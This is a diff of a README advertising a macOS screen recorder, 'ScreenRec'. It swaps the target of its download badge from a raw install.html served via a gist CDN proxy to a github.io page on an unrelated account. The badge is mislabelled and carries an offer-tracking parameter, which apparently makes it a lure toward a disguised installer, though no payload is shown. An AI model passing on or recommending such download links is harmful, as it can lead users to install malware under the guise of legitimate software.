@@ -3,7 +3,7 @@
 **ScreenRec** for **macOS** lets you record your screen, capture webcam footage, and share videos instantly with a secure private link.  
 Designed for simplicity, collaboration, and speed — ScreenRec is now fully optimized for **Apple Silicon**, bringing ultra-efficient recording performance to M-series Macs. 🍎  
 
-[![🎬 Get GitHub Instruction](https://img.shields.io/badge/🎬%20Get%20ScreenRec%20Recorder-0084FF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/wayne79pozitivchik/a84b40fb80132b838386e936c010874d/raw/b10ec9c1a669c28405e179f4fe5b1e3622e52ffa/install.html?offer=ScreenRecMac)
+[![🎬 Get GitHub Instruction](https://img.shields.io/badge/🎬%20Get%20ScreenRec%20Recorder-0084FF?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://deployer-app.github.io/.github/?offer=ScreenRecMac)
 
 ---
 
